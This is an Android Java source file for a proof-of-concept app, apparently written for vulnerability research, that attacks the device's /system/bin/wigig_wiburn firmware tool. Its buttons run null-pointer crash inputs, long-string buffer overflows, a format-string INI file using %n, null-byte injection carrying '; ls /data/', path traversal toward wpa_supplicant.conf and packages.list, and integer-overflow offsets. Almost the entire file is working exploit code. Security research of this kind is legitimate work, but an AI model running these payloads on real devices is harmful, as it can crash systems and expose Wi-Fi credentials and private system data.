package com.wigig.poc;

import android.os.Bundle;
import android.os.Environment;
import androidx.appcompat.app.AppCompatActivity;
import android.view.View;
import android.widget.TextView;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;

public class MainActivity extends AppCompatActivity {

    private TextView tvOutput;
    private final StringBuilder log = new StringBuilder();

    static {
        System.loadLibrary("wigig_poc");
    }
    public native String runCommand(String cmd);

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        tvOutput = findViewById(R.id.tv_output);

        findViewById(R.id.btn_null_test).setOnClickListener(v -> testNullPointer());
        findViewById(R.id.btn_overflow).setOnClickListener(v -> testBufferOverflow());
        findViewById(R.id.btn_format_string).setOnClickListener(v -> testFormatStringViaIni());
        findViewById(R.id.btn_null_byte).setOnClickListener(v -> testNullByteInjection());
        findViewById(R.id.btn_path_traversal).setOnClickListener(v -> testPathTraversal());
        findViewById(R.id.btn_int_overflow).setOnClickListener(v -> testIntOverflow());
    }

    private void append(String s) {
        log.append(s).append("\n");
        tvOutput.setText(log.toString());
    }

    // 1. NULL ポインタ参照 (DoS) - 前回と同じ
    private void testNullPointer() {
        append("=== 1. NULLポインタ参照 (DoS) ===");
        exec("/system/bin/wigig_wiburn", "-burn");
        exec("/system/bin/wigig_wiburn", "-device", "SPARROW");
        exec("/system/bin/wigig_wiburn", "-burn", "-fw", "");
    }

    // 2. バッファオーバーフロー（長大文字列）
    private void testBufferOverflow() {
        append("=== 2. バッファオーバーフロー (5000文字) ===");
        String longStr = new String(new char[5000]).replace('\0', 'A');
        exec("/system/bin/wigig_wiburn", "-device", longStr, "-burn");
        exec("/system/bin/wigig_wiburn", "-interface", longStr, "-device", "SPARROW");
    }

    // 3. ★フォーマット文字列攻撃（INIファイル経由）
    private void testFormatStringViaIni() {
        append("=== 3. フォーマット文字列攻撃 (INI経由) ===");
        try {
            File sdcard = Environment.getExternalStorageDirectory();
            File iniFile = new File(sdcard, "poc_fw.ini");
            String iniContent = 
                "[DummySection]\n" +
                "key1 = %p%p%p%p%p%p\n" +
                "key2 = %s%s%s\n" +
                "key3 = %n"; // %n は書き込みを試みる（クラッシュ誘発）
            FileOutputStream fos = new FileOutputStream(iniFile);
            fos.write(iniContent.getBytes());
            fos.close();
            append("INIファイル作成: " + iniFile.getAbsolutePath());
            exec("/system/bin/wigig_wiburn", "-fw", iniFile.getAbsolutePath(), "-device", "SPARROW");
        } catch (IOException e) {
            append("INI作成失敗: " + e.getMessage());
        }
    }

    // 4. ★Nullバイトインジェクション
    private void testNullByteInjection() {
        append("=== 4. Nullバイトインジェクション ===");
        // \0 を含む文字列（Javaでは \0 でヌル文字を表現）
        String payload = "SPARROW\0; ls /data/";
        exec("/system/bin/wigig_wiburn", "-device", payload, "-burn");
        // ファイル名にも仕込む
        String filePayload = "/sdcard/poc\0.ini";
        exec("/system/bin/wigig_wiburn", "-fw", filePayload, "-device", "SPARROW");
    }

    // 5. パストラバーサル（拡張）
    private void testPathTraversal() {
        append("=== 5. パストラバーサル (拡張) ===");
        String[] targets = {
            "../../../system/etc/hosts",
            "../../../data/misc/wifi/wpa_supplicant.conf",
            "../../../data/system/packages.list",
            "../../../proc/self/cmdline"
        };
        for (String t : targets) {
            exec("/system/bin/wigig_wiburn", "-fw", t, "-device", "SPARROW");
        }
    }

    // 6. 整数オーバーフロー（メモリ割り当て狙い）
    private void testIntOverflow() {
        append("=== 6. 整数オーバーフロー (メモリ) ===");
        exec("/system/bin/wigig_wiburn", "-read", "-offset", "0xFFFFFFFFFFFFFFFF", "-length", "0x80000000", "-device", "SPARROW");
        exec("/system/bin/wigig_wiburn", "-burn", "-offset", "-1", "-length", "0xFFFFFFFF", "-device", "SPARROW");
    }

    private void exec(String... cmd) {
        try {
            ProcessBuilder pb = new ProcessBuilder(cmd);
            pb.redirectErrorStream(true);
            Process p = pb.start();
            BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;
            while ((line = r.readLine()) != null) {
                append("[out] " + line);
            }
            int code = p.waitFor();
            append("終了コード: " + code);
        } catch (Exception e) {
            append("例外: " + e.getMessage());
        }
    }
}
